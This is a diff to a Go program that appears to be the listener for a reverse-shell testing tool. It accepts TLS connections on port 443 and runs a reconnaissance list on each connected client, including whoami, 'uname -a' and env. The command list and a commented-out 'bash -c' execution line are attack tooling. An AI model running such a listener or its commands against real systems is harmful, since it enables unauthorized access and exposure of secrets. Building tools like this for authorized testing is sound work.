@@ -56,26 +56,28 @@ func downloadFile(conn *tls.Conn, path string) {
 	handleError(err)
 }
 
-func sendEmail(enable bool, arguments []string, conn net.Conn){ //use ind 3
-	if !enable{
+func sendEmail(enable bool, arguments []string, conn net.Conn) { //use ind 3
+	if !enable {
 		return
 	}
 }
 
-func sendSlackMessage(enable bool, arguments []string, conn net.Conn){ //use ind 4
-	if !enable{
+func sendSlackMessage(enable bool, arguments []string, conn net.Conn) { //use ind 4
+	if !enable {
 		return
 	}
 }
 
 func main() {
 	var cmdsToRun = []string{"ls", "uname -a", " whoami", "pwd      ", "env"}
+
 	arguments := os.Args
 	_ = checkFlags(arguments, len(arguments), cmdsToRun)
 	emailEN, slackEN := checkEmailSlackFlag(arguments, len(arguments))
 
 	var PORT string
 	PORT = "443"
+	genCert("goshelly@gmail.com")
 	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
 	if err != nil {
 		log.Fatalf("server: loadkeys: %s", err)
@@ -91,13 +93,13 @@ func main() {
 	fmt.Println("Server Listening on port: ", PORT)
 	for {
 		conn, err := listener.Accept()
-		
+
 		if err != nil {
 			log.Printf("Client accept error: %s", err)
 			break
 		}
-		
-		sendEmail(emailEN, arguments, conn) //returns if enable if false
+
+		sendEmail(emailEN, arguments, conn)        //returns if enable if false
 		sendSlackMessage(slackEN, arguments, conn) //returns if enable is false
 
 		defer conn.Close()
@@ -115,9 +117,11 @@ func main() {
 }
 
 func genCert(email string) string {
-	cmd, err := exec.Command("/bin/sh", "../certGen.sh", email).Output()
+	cmd, err := exec.Command("bash", "./certGen.sh", email).Output()
+	// cmd, err := exec.Command("bash", "-c", input).Output()
 	if err != nil {
 		fmt.Printf("Error generating SSL Certificate: %s", err)
+		os.Exit(1)
 	}
 	outstr := string(cmd)
 	return outstr
@@ -148,16 +152,16 @@ func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
 		log.Fatal(err)
 	}
 	defer file.Close()
-	logger := log.New(file,"", log.LstdFlags)
+	logger := log.New(file, "", log.LstdFlags)
 	runAttackSequence(conn, logger, cmdsToRun)
 	disconnectClient(conn, logger, *file)
 }
 
-func setReadDeadLine(conn net.Conn)  {
+func setReadDeadLine(conn net.Conn) {
 	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 	if err != nil {
 		log.Println("SetReadDeadline failed:", err)
-	}	
+	}
 }
 
 func setWriteDeadLine(conn net.Conn) {
@@ -167,7 +171,7 @@ func setWriteDeadLine(conn net.Conn) {
 	}
 }
 
-func checkEmailSlackFlag(argument []string,l int) (bool, bool) {
+func checkEmailSlackFlag(argument []string, l int) (bool, bool) {
 	switch l {
 	case 3:
 		log.Print("No email address or Slack Hook provided")
@@ -184,6 +188,7 @@ func checkEmailSlackFlag(argument []string,l int) (bool, bool) {
 		return false, false
 	}
 }
+
 func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 	switch arguments[1] {
 	case "-a": //run sample commands -> echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"
@@ -193,6 +198,7 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 			fmt.Println("No filename specified.")
 			os.Exit(1)
 		}
+
 		//check if filepath exists
 		if _, err := os.Stat(arguments[2]); err == nil {
 			fmt.Printf("File exists\n")
@@ -225,7 +231,6 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 		os.Exit(1)
 	}
 	return false
-
 }
 
 func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
